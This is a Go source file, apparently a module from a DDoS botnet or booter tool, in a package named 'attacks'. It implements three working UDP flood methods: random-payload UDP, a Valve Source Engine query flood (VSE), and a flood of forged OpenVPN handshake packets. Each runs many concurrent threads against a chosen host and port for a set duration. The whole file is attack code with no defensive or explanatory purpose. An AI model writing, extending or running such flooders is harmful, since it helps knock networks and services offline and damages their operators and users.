package attacks

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"time"
)

type UDP struct {
}

func (u UDP) Name() string {
	return "udp"
}

func (u UDP) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			for time.Now().Before(endAt) {
				if port == 0 {
					port = randInt(1, 65535)
				}
				payload := make([]byte, size)
				rand.Read(payload)
				conn, err := net.Dial("udp", host+":"+strconv.Itoa(port))
				if err != nil {
					fmt.Println(err)
					continue
				}
				conn.Write(payload)
				conn.Close()
			}
		}()
	}
}

func (u UDP) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

type VSE struct {
}

func (u VSE) Name() string {
	return "vse"
}

func (u VSE) Send(host string, port int, seconds int, size int, threads int) {
	payload := []byte("/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ w290w2xn")

	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			for time.Now().Before(endAt) {
				conn, err := net.Dial("udp", host+":"+strconv.Itoa(port))
				if err != nil {
					fmt.Println(err)
					continue
				}
				conn.Write(payload)
				conn.Close()
			}
		}()
	}
}

func (u VSE) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

type OpenVpn struct {
}

func (u OpenVpn) Name() string {
	return "openvpn"
}

func (u OpenVpn) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			openvpn := []byte{
				0x38, 0xc4, 0xfb, 0x98, 0x76, 0x1f, 0xfc, 0xfe,
				0xf4, 0x00, 0x00, 0x00, 0x01, 0x63, 0x31, 0x7b,
				0x62, 0x36, 0x3e, 0xb1, 0xa8, 0x93, 0xa8, 0x61,
				0x98, 0x8b, 0x11, 0x2a, 0x3f, 0x7c, 0x1e, 0xaa,
				0xbf, 0xc0, 0x63, 0xad, 0xb7, 0x50, 0x68, 0xa0,
				0xd6, 0x2d, 0x0e, 0x17, 0x3d, 0xf8, 0xd4, 0xf4,
				0x39, 0x69, 0x8d, 0x69, 0x0d, 0x7d,
			}
			for i := 1; i < 9; i++ {
				token := make([]byte, 1)
				rand.Read(token)
				openvpn[i] = token[0]
			}
			for i := 14; i < 54; i++ {
				token := make([]byte, 1)
				rand.Read(token)
				openvpn[i] = token[0]
			}
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			if port == 0 {
				port = randInt(1, 65535)
			}
			for time.Now().Before(endAt) {
				conn, err := net.Dial("udp", host+":"+strconv.Itoa(port))
				if err != nil {
					fmt.Println(err)
					continue
				}
				conn.Write(openvpn)
				conn.Close()
			}
		}()
	}
}

func (u OpenVpn) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}
